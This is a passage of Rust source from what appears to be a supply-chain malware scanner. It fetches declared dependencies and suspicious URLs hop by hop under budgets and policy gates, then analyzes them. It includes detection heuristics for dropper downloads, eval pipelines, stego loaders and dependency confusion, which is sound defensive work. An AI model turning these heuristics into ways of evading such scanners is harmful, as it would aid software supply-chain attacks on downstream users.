    /// Image URLs whose declaring file shows a stego loader: exempt from the
    /// page-asset extension filter. Hop 0 only — later hops hunt payload bytes
    /// before any analysis, so there are no findings to vouch for one.
    carriers: HashSet<String>,
    /// source content-sha → the declaring manifest's path (relative to the root
    /// artifact), so each dependency row can name the file it came from. A
    /// source discovered only inside a fetched payload (a deeper hop) simply
    /// isn't found and stays unnamed.
    manifests: HashMap<String, String>,
    graft: Graft,
    out: FetchOutcome,
    /// (declaring file sha) -> (registry records materialized, of which security-held)
    registry_outcomes: BTreeMap<String, (u64, u64)>,
    /// Set when `SCAN_FETCH_ONLY` has stopped the run.
    stopped: bool,
    root_sha: String,
    current_hop: u8,
    pending_error: Option<String>,
    pending: Option<Arc<pending::Store>>,
    local_coverage: HashMap<(String, String), String>,
}

impl FetchSession {
    fn new(
        report: &AnalysisReport,
        worklist: &[Group],
        policy: FetchPolicy,
        res: &'static Resources,
        reporter: Reporter,
        capture_deps: bool,
        zip_passwords: &[String],
    ) -> Self {
        cleave::set_compact_member_retention(true); // compact projection only
        let mut opts = AnalysisOptions {
            skip_predicate: dep_skip_predicate(),
            rizin_timeout: crate::engine::rizin_timeout(),
            rizin_retry_timeout: crate::engine::rizin_retry_timeout(),
            ..AnalysisOptions::default()
        };
        crate::engine::add_zip_passwords(&mut opts, zip_passwords);
        // Phantom-dependency signal: a package imperatively installed or loaded
        // somewhere in this artifact but absent from its manifest's declared
        // deps — a covertly-installed companion or a dependency-confusion
        // target. Computed across the whole work-list so a member's
        // `require("x")` is diffed against the root manifest's declarations.
        // Surfaced at debug, not warn: this is only meaningful when a manifest
        // is present to diff against. Scanning loose files (no manifest) flags
        // every imperative import as "undeclared", so emitting it by default is
        // noise. `--verbose` (scan=debug) still exposes it for investigation.
        let all_refs: Vec<Reference> = worklist
            .iter()
            .flat_map(|(_, refs)| refs.iter().cloned())
            .collect();
        for u in find::undeclared_packages(&all_refs) {
            tracing::debug!(
                package = %locator(u),
                source = %u.source,
                "undeclared dependency: imperatively acquired but not declared in manifest"
            );
        }
        Self {
            policy,
            res,
            knobs: knobs(),
            precheck: crate::corpus_precheck::armed(),
            registry_opts: AnalysisOptions {
                disable_yara: true,
                ..opts.clone()
            },
            opts,
            acache: OnceLock::new(),
            reporter,
            capture_deps,
            now: unix_now(),
            host: host_platform(),
            deadline: Deadline::new(policy.max_duration),
            budget: RootBudget::new(&policy),
            seen: HashSet::new(),
            newest: HashMap::new(),
            pinned: HashSet::new(),
            redirect_credit: HashMap::new(),
            carriers: image_carrier_urls(report, worklist),
            manifests: report
                .files
                .iter()
                .map(|f| (f.sha256.clone(), manifest_relpath(&f.path)))
                .collect(),
            graft: Graft::new(report),
            out: FetchOutcome::default(),
            registry_outcomes: BTreeMap::new(),
            stopped: false,
            root_sha: report
                .files
                .first()
                .map(|f| f.sha256.clone())
                .unwrap_or_default(),
            current_hop: 0,
            pending_error: None,
            pending: PENDING.get().cloned(),
            local_coverage: HashMap::new(),
        }
    }

    /// Walk the hops: each works from the references found inside the
    /// previous hop's payloads.
    fn run(&mut self, report: &mut AnalysisReport, mut worklist: Vec<Group>) {
        let mut resumed: BTreeMap<u8, Vec<Group>> = BTreeMap::new();
        if let Some(store) = self.pending.as_ref() {
            match store.entries(&self.root_sha) {
                Ok(entries) => {
                    for entry in entries {
                        self.redirect_credit
                            .entry(entry.source_sha.clone())
                            .and_modify(|credit| *credit = (*credit).max(entry.redirect_credit))
                            .or_insert(entry.redirect_credit);
                        resumed
                            .entry(entry.hop)
                            .or_default()
                            .push((entry.source_sha, vec![entry.reference]));
                    }
                }
                Err(error) => self.pending_error = Some(error.to_string()),
            }
        }
        let end = self.policy.depth.saturating_add(MAX_REDIRECT_HOPS);
        for hop in 0..end {
            self.current_hop = hop;
            worklist.extend(resumed.remove(&hop).unwrap_or_default());
            let mut allowed = Vec::new();
            for group in worklist {
                if hop
                    < self
                        .policy
                        .depth
                        .saturating_add(self.redirect_credit.get(&group.0).copied().unwrap_or(0))
                {
                    allowed.push(group);
                } else {
                    self.defer_groups(&[group], hop, "depth limit");
                }
            }
            worklist = allowed;
            if self.deadline.passed() {
                self.defer_groups(&worklist, hop, "fetch timeout");
                worklist.clear();
                break;
            }
            if worklist.is_empty() {
                continue;
            }
            let local = LocalNpmPackages::from_report(report);
            let mut covered = Vec::new();
            for (source, refs) in &mut worklist {
                refs.retain(|reference| {
                    if !self.policy.wants_at(reference.kind, hop) { return true; }
                    let Some(path) = local.declared_coverage(report, source, reference) else { return true; };
                    if reference.pinned_hash.is_some() {
                        self.local_coverage.insert((source.clone(), locator(reference).to_owned()), path);
                        return true;
                    }
                    let mut record = FetchRecord::terminal(locator(reference).to_owned(), Outcome::Skipped);
                    record.source_sha256 = Some(source.clone()); record.source_offset = reference.offset;
                    record.kind = reference.kind; record.context = reference.context.clone();
                    record.coverage_note = Some(format!("supplied code already analyzed: {path}; registry archive identity not verified"));
                    self.out.records.push(record);
                    covered.push(self.pending_entry(source, reference, hop, "supplied code"));
                    false
                });
            }
            self.checkpoint(&[], &covered);
            for (_, refs) in &mut worklist {
                refs.sort_by_key(dependency_execution_priority);
            }
            worklist.sort_by_key(|(_, refs)| {
                refs.iter()
                    .map(dependency_execution_priority)
                    .min()
                    .unwrap_or(3)
            });
            self.bid_versions(&worklist, hop);
            worklist = self.hop(report, worklist, hop);
            if self.stopped {
                break;
            }
        }
        self.defer_groups(&worklist, end, "depth limit");
        for (hop, groups) in resumed {
            self.defer_groups(&groups, hop, "depth limit or fetch timeout");
        }
    }

    fn pending_entry(
        &self,
        source: &str,
        reference: &Reference,
        hop: u8,
        reason: &str,
    ) -> pending::Entry {
        pending::Entry {
            root_sha: self.root_sha.clone(),
            source_sha: source.to_owned(),
            hop,
            reference: reference.clone(),
            reason: reason.to_owned(),
            redirect_credit: self.redirect_credit.get(source).copied().unwrap_or(0),
        }
    }
    fn checkpoint(&mut self, additions: &[pending::Entry], completed: &[pending::Entry]) {
        if let Some(store) = self.pending.as_ref()
            && let Err(error) = store.update(additions, completed)
        {
            tracing::error!(%error, "fetch backlog checkpoint failed");
            self.pending_error = Some(error.to_string());
        }
    }
    fn defer_groups(&mut self, groups: &[Group], hop: u8, reason: &str) {
        let entries: Vec<_> = groups
            .iter()
            .flat_map(|(sha, refs)| {
                refs.iter()
                    .filter(|r| r.is_fetch_target() && self.policy.wants(r.kind))
                    .map(|r| self.pending_entry(sha, r, hop, reason))
            })
            .collect();
        self.checkpoint(&entries, &[]);
        for entry in entries {
            let mut record =
                FetchRecord::terminal(locator(&entry.reference).to_owned(), Outcome::Skipped);
            record.source_sha256 = Some(entry.source_sha);
            record.source_offset = entry.reference.offset;
            record.kind = entry.reference.kind;
            record.context = entry.reference.context;
            record.coverage_note = Some(format!("pending: {reason}; hop={hop}"));
            self.out.records.push(record);
        }
    }

    /// Pre-scan a whole hop so the newest version is hop-wide, not
    /// first-group-wins: every fetchable versioned reference bids, and the
    /// running cross-hop maximum only rises.
    fn bid_versions(&mut self, worklist: &[Group], hop: u8) {
        for r in worklist.iter().flat_map(|(_, refs)| refs) {
            if !self.policy.wants_at(r.kind, hop) {
                continue;
            }
            let Some((key, version)) = versioned_purl(locator(r)) else {
                continue;
            };
            // This coordinate is pinned somewhere; its bare sibling loses.
            self.pinned.insert(key.to_string());
            let newer = self.newest.get(key).is_none_or(|best| {
                lenient_version_cmp(version, best) == std::cmp::Ordering::Greater
            });
            if newer {
                self.newest.insert(key.to_string(), version.to_string());
            }
        }
    }

    /// One hop, in batches. The declaring-file groups of a hop are independent
    /// until their serial merge, but a deep tree yields many small groups — one
    /// per previous-hop payload — and analyzing one group at a time strands most
    /// of a large machine on the tail. So selection, gating, and fetching stay
    /// serial in group order (`seen` dedup and budget charges keep their exact
    /// order), registry-record and payload analysis fan out across the whole
    /// batch, and merging replays serially in group order — report ids, and
    /// therefore output, do not depend on batching.
    fn hop(&mut self, report: &mut AnalysisReport, worklist: Vec<Group>, hop: u8) -> Vec<Group> {
        // Fetch-only stops after the first group that fetches anything, so it
        // plans one such group at a time.
        let target = if self.knobs.fetch_only {
            1
        } else {
            BATCH_PAYLOAD_TARGET
        };
        let mut groups = worklist.into_iter();
        let mut next = Vec::new();
        let mut dropped_old_versions = 0usize;
        let mut exhausted = false;
        while !exhausted && !self.deadline.passed() {
            let mut plans = Vec::new();
            let mut planned = 0usize;
            while planned < target {
                // Re-checked per group, not per batch: stopping only at the
                // batch edge would overrun the cap by a whole batch's fetches.
                if self.deadline.passed() {
                    break;
                }
                let Some((source_sha, refs)) = groups.next() else {
                    exhausted = true;
                    break;
                };
                let selected = self.select(&source_sha, refs, hop, &mut dropped_old_versions);
                if selected.is_empty() {
                    continue;
                }
                let plan = self.plan(source_sha, selected);
                planned += plan.selected.len();
                plans.push(plan);
            }
            if plans.is_empty() {
                continue;
            }
            let corpus = self.precheck_purls(&plans);
            let batch: Vec<GroupFetch> = plans
                .into_iter()
                .map(|plan| self.fetch_group(plan, &corpus))
                .collect();
            if self.knobs.fetch_only && batch.iter().any(|g| !g.landed.is_empty()) {
                self.stop_after_fetch(batch);
                return Vec::new();
            }
            let analyzed = self.analyze_batch(&batch);
            for (group, analysis) in batch.into_iter().zip(analyzed) {
                self.merge_group(report, group, analysis, &mut next);
            }
        }
        let leftovers: Vec<_> = groups.collect();
        self.defer_groups(&leftovers, hop, "fetch timeout");
        if dropped_old_versions > 0 {
            tracing::info!(
                skipped = dropped_old_versions,
                "older package versions skipped this hop (newest-version policy)"
            );
        }
        next
    }

    /// Keep only the references this hop follows and this run has not yet
    /// seen. Selection is by [`RefKind`], so a command-mentioned package
    /// (`packages`) is distinct from a declared dependency (`deps`) even though
    /// both are PURLs.
    fn select(
        &mut self,
        source_sha: &str,
        refs: Vec<Reference>,
        hop: u8,
        dropped_old: &mut usize,
    ) -> Vec<Reference> {
        let mut selected = Vec::new();
        for r in refs {
            if !self.policy.include_dev_dependencies
                && r.context
                    .as_ref()
                    .is_some_and(|c| c.scope == filefacts::DependencyScope::Development)
            {
                let mut record = FetchRecord::terminal(locator(&r).to_owned(), Outcome::Skipped);
                record.source_sha256 = Some(source_sha.to_owned());
                record.source_offset = r.offset;
                record.kind = r.kind;
                record.context = r.context.clone();
                record.coverage_note =
                    Some("development-only dependency excluded by --fetch-dev-deps=false".into());
                self.out.records.push(record);
                continue;
            }
            if self.wanted(&r, hop)
                && self.fetchable(&r)
                && !self.off_host(&r)
                && self.newest_version(&r, dropped_old)
                && !self.superseded(&r)
                && self.seen.insert(fetch_work_key(&r))
            {
                selected.push(r);
            }
        }
        selected
    }

    fn wanted(&self, r: &Reference, hop: u8) -> bool {
        if r.context
            .as_ref()
            .is_some_and(|c| c.scope == filefacts::DependencyScope::Ci)
            && !self.policy.ci
        {
            return false;
        }
        if !self.policy.include_dev_dependencies
            && r.context
                .as_ref()
                .is_some_and(|c| c.scope == filefacts::DependencyScope::Development)
        {
            return false;
        }
        let wanted = self.policy.wants_at(r.kind, hop);
        if !wanted && self.policy.wants(r.kind) {
            tracing::debug!(
                package = %locator(r),
                hop = hop + 1,
                "transitive dependency; registry lookup and fetch both skipped"
            );
        }
        wanted
    }

    /// Whether a reference can be fetched at all, and — for a discovered URL —
    /// whether it is worth a round trip. Publisher-controlled URLs, obvious
    /// site/API endpoints, and the exact documentation/update URLs observed in
    /// stock /bin binaries cost a round trip each and are unlikely to yield a
    /// dropper payload. Applied per hop so a payload's own boilerplate is
    /// filtered too, and only to *discovered* references: `scan url <url>`
    /// fetches whatever the operator names (see `crate::hosts`).
    fn fetchable(&self, r: &Reference) -> bool {
        let raw = match &r.locator {
            RefLocator::Purl(_) => return true,
            // Resolved against the artifact's own files, never fetched.
            RefLocator::Path(path) => {
                tracing::debug!(path = %path, source = %r.source, "intra-artifact path; not a fetch");
                return false;
            }
            RefLocator::Url(raw) => raw,
            // A locator kind this scan predates names nothing it can fetch.
            _ => return false,
        };
        let skip = |why: &str| {
            tracing::debug!(url = %raw, source = %r.source, "{why}; fetch skipped");
            false
        };
        let Ok(url) = Url::parse(raw) else {
            return skip("invalid or local URL host");
        };
        if !valid_discovered_url_host(&url) {
            return skip("invalid or local URL host");
        }
        if has_unexpanded_url_placeholder(raw) {
            return skip("unexpanded URL template");
        }
        if hosts::publisher_controlled(&url) || hosts::discovery_exception(raw, &url) {
            return skip("known boilerplate URL");
        }
        if r.kind == RefKind::UrlFetch
            && !looks_like_dropper_download_url(&url)
            && !is_eval_pipeline_url(r)
            && !is_download_to_file_url(r)
            && !is_redirect_destination(r)
            && !self.carriers.contains(raw)
        {
            return skip("URL does not look like a dropper download or eval pipeline");
        }
        true
    }

    /// Native-binary dependencies built for another platform are dropped before
    /// they're ever fetched — the host variant is scanned, its linux/windows
    /// siblings never run here. Off unless the policy asks for it
    /// (`--fetch-all-platforms` audits every platform).
    fn off_host(&self, r: &Reference) -> bool {
        let off_host = self.policy.host_platform_only && off_host_platform(r, self.host);
        if off_host {
            tracing::debug!(
                package = %locator(r),
                host_os = self.host.0,
                host_arch = self.host.1,
                "dependency pinned to another platform; skipped (--fetch-all-platforms to include)"
            );
        }
        off_host
    }

    /// Older-version duplicates are skipped entirely — no registry-record
    /// materialization, no fetch (operator policy 2, 2026-07-30). Never silent:
    /// each skip logs at debug, the hop logs one count at info.
    fn newest_version(&self, r: &Reference, dropped_old: &mut usize) -> bool {
        if self.policy.all_versions {
            return true;
        }
        let Some((key, version)) = versioned_purl(locator(r)) else {
            return true;
        };
        match self.newest.get(key) {
            Some(newest) if lenient_version_cmp(version, newest) == std::cmp::Ordering::Less => {
                *dropped_old += 1;
                tracing::debug!(
                    package = %locator(r),
                    newest = %newest,
                    "older version of an already-kept package; skipped (newest-version policy)"
                );
                false
            }
            _ => true,
        }
    }

    /// A lockfile pin supersedes the manifest's versionless sibling: a bare
    /// `pkg:eco/name` is dropped when the same coordinate is pinned elsewhere
    /// in the tree, so the exact installed version is scanned instead of
    /// `dist-tags/latest`.
    fn superseded(&self, r: &Reference) -> bool {
        let superseded = superseded_by_pin(r, &self.pinned);
        if superseded {
            tracing::debug!(
                package = %locator(r),
                "versionless dependency superseded by a lockfile-pinned sibling; skipped"
            );
        }
        superseded
    }

    /// Look up each declared dependency's registry metadata first. Every
    /// resolved record is materialized as a `*.registry.json` node so its facts
    /// are trait-matched, and releases older than the age ceiling are dropped
    /// before the expensive fetch+scan of their bytes. Skips are reported, never
    /// silent.
    fn plan(&mut self, source_sha: String, selected: Vec<Reference>) -> GroupPlan {
        let (selected, registries) = age_gate(selected, &self.policy, self.res, self.now);
        // Reveal the kept (to-fetch) set as pending, so the tree shows the
        // dependencies it will actually scan up front. Aged-out deps are
        // deliberately never announced — for a large npm graph they are the
        // overwhelming majority and only a registry-metadata lookup runs on
        // them, so listing them would bury the handful of live scans.
        self.reporter.announce(
            &selected,
            self.manifests.get(&source_sha).map_or("", String::as_str),
        );
        GroupPlan {
            source_sha,
            selected,
            registries,
        }
    }

    /// Pre-fetch PURL negotiation for a whole batch: hopper may hold a standing
    /// verdict (same rules as the per-sha corpus precheck) for a registry
    /// dependency whose content sha we would otherwise only learn by
    /// downloading it. One batched lookup up front skips the download, the
    /// analysis, and the re-upload for every such PURL; the answer's sha still
    /// records the fetch edge. Anything unanswered fetches exactly as before.
    fn precheck_purls(
        &self,
        plans: &[GroupPlan],
    ) -> HashMap<String, crate::corpus_precheck::PurlHit> {
        let Some(precheck) = &self.precheck else {
            return HashMap::new();
        };
        let candidates: Vec<String> = plans
            .iter()
            .flat_map(|plan| &plan.selected)
            .filter(|r| {
                r.kind != RefKind::UrlFetch
                    && matches!(r.locator, RefLocator::Purl(_))
                    && r.content_sha256.is_none()
            })
            .map(|r| locator(r).to_owned())
            .collect();
        if candidates.is_empty() {
            return HashMap::new();
        }
        let hits = precheck.purls(&candidates);
        if !hits.is_empty() {
            tracing::info!(
                skipped = hits.len(),
                asked = candidates.len(),
                "purl precheck: hopper verdicts stand; skipped fetch+analysis+upload"
            );
        }
        hits
    }

    /// Fetch one group's selected references: dependencies and
    /// command-mentioned packages under one cap, opportunistic URLs under their
    /// own smaller one, and none at all for a dependency the corpus answered.
    fn fetch_group(
        &mut self,
        plan: GroupPlan,
        corpus: &HashMap<String, crate::corpus_precheck::PurlHit>,
    ) -> GroupFetch {
        let GroupPlan {
            source_sha,
            selected,
            registries,
        } = plan;
        if selected.is_empty() {
            // Nothing to fetch; the group still merges its registry records.
            return GroupFetch {
                source_sha,
                registries,
                landed: Vec::new(),
            };
        }
        let entries: Vec<_> = selected
            .iter()
            .map(|r| self.pending_entry(&source_sha, r, self.current_hop, "in progress"))
            .collect();
        self.checkpoint(&entries, &[]);
        let mut slots: Vec<Option<(FetchRecord, Standing)>> = vec![None; selected.len()];
        let mut deps = Vec::new();
        let mut urls = Vec::new();
        for (i, r) in selected.iter().enumerate() {
            if r.kind == RefKind::UrlFetch {
                urls.push(keyed(r, i));
            } else if let Some(hit) = corpus.get(locator(r)) {
                slots[i] = Some((
                    corpus_hit_record(r, &source_sha, &hit.sha),
                    hit.standing.clone(),
                ));
            } else {
                deps.push(keyed(r, i));
            }
        }
        // Mark the to-fetch set in flight, then fetch. Dependencies go first
        // and are charged before URLs start, so both budgets hold between the
        // two fletch calls.
        self.reporter.fetching(&selected);
        let (dep_records, dep_notice) = self.fetch_class(FetchClass::Deps, &deps, &source_sha);
        let (url_records, url_notice) = self.fetch_class(FetchClass::Urls, &urls, &source_sha);
        pair_records(
            &selected,
            dep_records.into_iter().chain(url_records),
            &mut slots,
        );
        let mut landed: Vec<Landed> = selected
            .into_iter()
            .zip(slots)
            .filter_map(|(reference, slot)| {
                slot.map(|(record, standing)| Landed {
                    reference,
                    record,
                    standing,
                })
            })
            .collect();
        // Authoritative pass over every returned edge: settle each row (the tree
        // finalizes any budget-clipped edge the live callback never saw;
        // re-settling a callback-landed row is idempotent) and print the
        // streamed line.
        for l in &mut landed {
            if let Some(path) = self
                .local_coverage
                .get(&(source_sha.clone(), locator(&l.reference).to_owned()))
            {
                let pin = if l.record.pin_verified == Some(true) {
                    "archive pin verified"
                } else {
                    "archive pin unverified"
                };
                l.record.coverage_note =
                    Some(format!("supplied code already analyzed: {path}; {pin}"));
            }
            self.reporter.landed(&l.reference, &l.record);
            let notice = if l.reference.kind == RefKind::UrlFetch {
                &url_notice
            } else {
                &dep_notice
            };
            self.reporter.report(&l.record, notice);
        }
        GroupFetch {
            source_sha,
            registries,
            landed,
        }
    }

    /// Fetch one class's references under this root's budget and the
    /// process-wide one: reserve from the total first, refund what went
    /// unspent. Returns the records and the notice a budget-clipped edge shows.
    fn fetch_class(
        &mut self,
        class: FetchClass,
        refs: &[Reference],
        source_sha: &str,
    ) -> (Vec<FetchRecord>, String) {
        if refs.is_empty() {
            return (Vec::new(), String::new());
        }
        let (flag, limit) = match class {
            FetchClass::Deps => ("--fetch-max-file-fetches", self.policy.max_file_fetches),
            FetchClass::Urls => ("--fetch-max-urls", self.policy.max_url_fetches),
        };
        let want = self.budget.want(class);
        let grant = TOTAL_BUDGET.reserve(want);
        let total_limited = if grant.fetches < want.fetches {
            grant.fetches
        } else {
            usize::MAX
        };
        let notice = fetch_count_budget_notice(flag, limit, total_limited);
        // The callback fires as each download lands (from a pool worker, so
        // it's `Sync`), flipping that row to "analyzing" the moment its bytes
        // arrive rather than when the whole concurrent batch returns.
        let reporter = &self.reporter;
        let on_fetched = |r: &Reference, rec: &FetchRecord| reporter.landed(r, rec);
        let budget = FetchBudget {
            max_count: grant.fetches,
            max_bytes: grant.bytes,
        };
        let mut records = match class {
            FetchClass::Deps => fetch_references_with(
                refs,
                source_sha,
                UrlFetches::Skip,
                &self.res.net,
                &self.res.cache,
                budget,
                &on_fetched,
            ),
            FetchClass::Urls => {
                let net = AsClient {
                    net: &self.res.net,
                    agents: refs
                        .iter()
                        .filter_map(|r| Some((locator(r).to_owned(), client_user_agent(r)?)))
                        .collect(),
                };
                fetch_references_with(
                    refs,
                    source_sha,
                    UrlFetches::Include,
                    &net,
                    &self.res.cache,
                    budget,
                    &on_fetched,
                )
            }
        };
        for record in &mut records {
            if matches!(record.outcome, Outcome::BudgetExceeded) {
                record.coverage_note = Some(format!(
                    "budget exceeded: {notice}; request allowance={}; byte allowance={}",
                    grant.fetches, grant.bytes
                ));
            }
        }
        let spent = live_fetch_usage(&records);
        TOTAL_BUDGET.settle(grant, spent);
        self.budget.spend(class, spent);
        (records, notice)
    }

    /// Analyze a batch. Registry records and fetched payloads are both
    /// report-independent, so they fan out together across every group in the
    /// batch — when the pool has headroom (see [`Fanout`]); saturated, the batch
    /// runs inline on this blocking thread, the shape cleave's own nesting
    /// throttle is written for. Each `registry_node` is an independent cleave
    /// analysis of one small JSON document at ~23 ms; a payload is a full
    /// cleave pass. Results align with `batch`.
    fn analyze_batch(&self, batch: &[GroupFetch]) -> Vec<GroupAnalysis> {
        let analyzes_bytes = batch
            .iter()
            .flat_map(|g| &g.landed)
            .any(|l| matches!(l.standing, Standing::Analyze) && delivered_bytes(&l.record));
        let payloads = Payloads {
            cache: &self.res.cache,
            opts: &self.opts,
            acache: if analyzes_bytes {
                self.acache.get_or_init(AnalysisCache::open).as_ref()
            } else {
                None
            },
            precheck: self.precheck.as_deref(),
        };
        let fanout = self.knobs.fanout;
        let registries_of = |g: &GroupFetch| -> Vec<Option<AnalysisReport>> {
            g.registries
                .iter()
                .map(|gated| registry_node(&gated.record, &self.registry_opts))
                .collect()
        };
        let payloads_of = |g: &GroupFetch| -> Vec<Option<Analyzed>> {
            // Settles each payload row from "analyzing" to its final glyph as
            // its scan finishes.
            let on_analyzed = |i: usize| {
                if let Some(l) = g.landed.get(i) {
                    self.reporter.analyzed(&l.reference, &l.record);
                }
            };
            payloads.analyze_all(&g.landed, fanout, &on_analyzed)
        };
        let (subs, payloads): (Vec<_>, Vec<_>) = if fanout.allowed() {
            use rayon::prelude::*;
            rayon::join(
                || batch.par_iter().map(&registries_of).collect(),
                || batch.par_iter().map(&payloads_of).collect(),
            )
        } else {
            (
                batch.iter().map(&registries_of).collect(),
                batch.iter().map(&payloads_of).collect(),
            )
        };
        subs.into_iter()
            .zip(payloads)
            .map(|(registries, payloads)| GroupAnalysis {
                registries,
                payloads,
            })
            .collect()
    }

    /// Merge one group — registry records before payloads, both in
    /// materialization order — because the graft assigns report ids from a
    /// running counter; merging in completion order would make ids (and
    /// therefore output) depend on timing.
    fn merge_group(
        &mut self,
        report: &mut AnalysisReport,
        group: GroupFetch,
        analysis: GroupAnalysis,
        next: &mut Vec<Group>,
    ) {
        let GroupFetch {
            source_sha,
            registries,
            mut landed,
        } = group;
        let GroupAnalysis {
            registries: subs,
            payloads,
        } = analysis;
        // Registry findings keyed by locator, captured as each record is merged
        // so the package pass below can pair an artifact with its own registry
        // metadata (see `apply_package_composites`).
        let mut registry_findings: HashMap<String, Vec<Finding>> = HashMap::new();
        for (gated, sub) in registries.into_iter().zip(subs) {
            self.merge_registry_record(report, &source_sha, gated, sub, &mut registry_findings);
        }
        for (l, payload) in landed.iter_mut().zip(payloads) {
            if payload.is_none()
                && delivered_bytes(&l.record)
                && matches!(l.standing, Standing::Analyze)
            {
                l.record.coverage_note = Some("analysis unavailable".into());
            }
            if payload
                .as_ref()
                .and_then(|p| p.sub.as_ref())
                .is_some_and(|sub| {
                    !sub.analysis_gaps.is_empty()
                        || sub.files.iter().any(|f| !f.analysis_gaps.is_empty())
                })
            {
                l.record.coverage_note = Some("analysis incomplete".into());
            }
            if let Some(payload) = payload {
                self.merge_landed(report, &source_sha, l, payload, &registry_findings, next);
            }
        }
        let mut pending = Vec::new();
        let mut completed = Vec::new();
        for l in &landed {
            let entry = self.pending_entry(
                &source_sha,
                &l.reference,
                self.current_hop,
                "fetch failed or budget exceeded",
            );
            if matches!(l.record.outcome, Outcome::BudgetExceeded)
                || matches!(&l.record.outcome, Outcome::Failed(error) if error.is_retryable())
                || matches!(
                    l.record.coverage_note.as_deref(),
                    Some("analysis incomplete" | "analysis unavailable")
                )
            {
                pending.push(entry);
            } else {
                completed.push(entry);
            }
        }
        self.checkpoint(&pending, &completed);
        let discovered: Vec<_> = next
            .iter()
            .flat_map(|(sha, refs)| {
                refs.iter()
                    .filter(|r| r.is_fetch_target() && self.policy.wants(r.kind))
                    .map(|r| {
                        self.pending_entry(sha, r, self.current_hop.saturating_add(1), "discovered")
                    })
            })
            .collect();
        self.checkpoint(&discovered, &[]);
        self.out
            .records
            .extend(landed.into_iter().map(|l| l.record));
    }

    /// Graft one materialized registry record under its declaring file, keep
    /// its provenance when anything downstream will read it, and report its
    /// skip.
    fn merge_registry_record(
        &mut self,
        report: &mut AnalysisReport,
        source_sha: &str,
        gated: Gated,
        sub: Option<AnalysisReport>,
        registry_findings: &mut HashMap<String, Vec<Finding>>,
    ) {
        let Gated {
            reference,
            record,
            sources,
            skip,
        } = gated;
        if let Some(sub) = sub {
            let findings = sub_findings(&sub);
            // Every registry record we materialized for this file is a
            // reference whose outcome the declarer should carry. Tallied here
            // rather than from the fetch records because the two travel
            // separately: a dependency resolved without a live download still
            // yields a registry document.
            let tally = self
                .registry_outcomes
                .entry(source_sha.to_owned())
                .or_insert((0, 0));
            tally.0 += 1;
            if findings
                .iter()
                .any(|f| f.id.contains(TRAIT_SECURITY_HOLD_RECORD))
            {
                tally.1 += 1;
            }
            // A skipped dependency has no artifact upload and only appears in
            // provenance output when its registry node is notable. Drop its raw
            // provider document when neither applies; lockfiles can contain
            // hundreds of ordinary aged-out records.
            let retain_provenance = skip.is_none()
                || findings
                    .iter()
                    .any(|finding| finding.crit >= cleave::Criticality::Notable);
            registry_findings
                .entry(locator(&reference).to_owned())
                .or_default()
                .extend(findings);
            if let Some(file_id) = merge_registry(report, &mut self.graft, source_sha, sub)
                && retain_provenance
            {
                // A memo hit kept only the record; its provider documents are
                // recovered from fletch's bounded blob cache now that they are
                // needed, and only now.
                let sources = sources.unwrap_or_else(|| {
                    fletch::registry_with_sources(
                        &reference.locator,
                        &self.res.net,
                        &self.res.cache,
                    )
                    .1
                });
                self.out.registries.push(DependencyRegistry {
                    locator: locator(&reference).to_owned(),
                    provenance: RegistryProvenance::from_record_sources(record.clone(), &sources),
                    file_id,
                    artifact_skip: skip.map(SkipReason::artifact_note),
                });
            }
        }
        // The record is materialized either way; only the artifact fetch is
        // skipped. `None` = kept for fetch+scan.
        let Some(reason) = skip else {
            return;
        };
        if reason == SkipReason::KnownGood {
            crate::bloom_repo::record(crate::bloom_repo::Decision::Skip, false);
        }
        let package = tracing::field::display(locator(&reference));
        // Age-outs are the common, expected case; they stay at debug so
        // `--verbose` can still see them, while removals and known-good skips —
        // the interesting decisions — are surfaced at info.
        match reason {
            SkipReason::AgedOut => tracing::debug!(
                package = %package,
                ecosystem = %record.ecosystem,
                version = %record.version,
                age_days = record.age_days.unwrap_or(0),
                downloads = record.downloads_recent.or(record.downloads_total),
                reason = reason.log_reason(),
                "registry record materialized; artifact fetch skipped"
            ),
            SkipReason::Removed | SkipReason::KnownGood => tracing::info!(
                package = %package,
                ecosystem = %record.ecosystem,
                version = %record.version,
                age_days = record.age_days.unwrap_or(0),
                downloads = record.downloads_recent.or(record.downloads_total),
                reason = reason.log_reason(),
                "registry record materialized; artifact fetch skipped"
            ),
        }
        // Settle the skipped row. The tree shows every reason (so no row is left
        // hanging as pending); the stream keeps flooding-averse behaviour,
        // printing only the surfaced removals/known-good skips.
        self.reporter.skipped(&reference, &record, self.now, reason);
    }

    /// Fold one analyzed payload into the run: its redirect credit, its
    /// standalone capture, an adopted verdict, and its subtree in the report.
    fn merge_landed(
        &mut self,
        report: &mut AnalysisReport,
        source_sha: &str,
        l: &Landed,
        mut payload: Analyzed,
        registry_findings: &HashMap<String, Vec<Finding>>,
        next: &mut Vec<Group>,
    ) {
        let credit = self
            .redirect_credit
            .get(source_sha)
            .copied()
            .unwrap_or(0)
            .saturating_add(u8::from(is_redirect_destination(&l.reference)));
        if credit > 0 {
            self.redirect_credit
                .insert(payload.content_sha.clone(), credit.min(MAX_REDIRECT_HOPS));
        }
        // Run registry-aware package composites on the dependency's standalone
        // report before either consumer takes it. This lets the dependency
        // grader see the same finding that the merged parent's embedded-file
        // pass sees, so a suspicious or hostile dependency can be pinned back to
        // its declaring manifest.
        prepare_dependency_report(
            &mut payload,
            registry_findings_for_reference(registry_findings, &l.reference),
            &self.opts,
        );
        // Capture the dependency's standalone report before merge_payload
        // consumes the sub-report into the merged tree — only when a consumer
        // (hopper upload, dependency appendix) will read it.
        if self.capture_deps
            && let Some(dep) = capture_dependency(&l.record, &payload)
        {
            self.out.dependencies.push(dep);
        }
        // A verdict the corpus handed us — from the batch PURL negotiation or
        // the per-sha precheck — is this dependency's evaluation, exactly as if
        // it had been analyzed here.
        if let Some(verdict) = &payload.corpus {
            self.out
                .adopted
                .insert(payload.content_sha.clone(), verdict.clone());
        }
        let mut discovered = merge_payload(report, &mut self.graft, &l.record, payload);
        inherit_dependency_context(&l.reference, &mut discovered);
        next.extend(discovered);
    }

    /// `SCAN_FETCH_ONLY`: keep the edges of what was fetched, say how much, and
    /// end the run here. Registry nodes — exactly the analysis this mode skips —
    /// do not merge.
    fn stop_after_fetch(&mut self, batch: Vec<GroupFetch>) {
        let records: Vec<FetchRecord> = batch
            .into_iter()
            .flat_map(|g| g.landed)
            .map(|l| l.record)
            .collect();
        let fetched = records.iter().filter(|r| r.size.is_some()).count();
        let bytes: u64 = records.iter().filter_map(|r| r.size).sum();
        tracing::info!(
            refs_selected = records.len(),
            payloads_fetched = fetched,
            fetched_bytes = bytes,
            "SCAN_FETCH_ONLY: stopping before payload analysis"
        );
        // stderr, so a JSON report on stdout stays parseable.
        eprintln!(
